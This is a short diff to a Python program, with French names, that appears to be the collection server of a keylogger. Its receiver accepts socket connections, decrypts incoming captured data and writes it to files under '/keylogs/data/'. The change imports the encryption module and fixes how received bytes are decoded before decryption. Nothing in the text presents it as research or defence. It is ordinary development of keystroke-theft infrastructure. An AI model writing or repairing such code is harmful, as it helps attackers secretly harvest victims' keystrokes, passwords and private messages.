@@ -5,8 +5,8 @@ import sys
 import threading
 import time
 import glob
+import chiffrement
 from chiffrement import *
-
 
 from env import *
 import datetime
@@ -75,7 +75,7 @@ def receiver(port):
         # recu data
         with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
-            f.write(dechiffrement(data))
+            f.write(dechiffrement(data.decode('utf-8')))
             print("connexion :" + ficname)
     client_socket.close()
     server_socket.close()
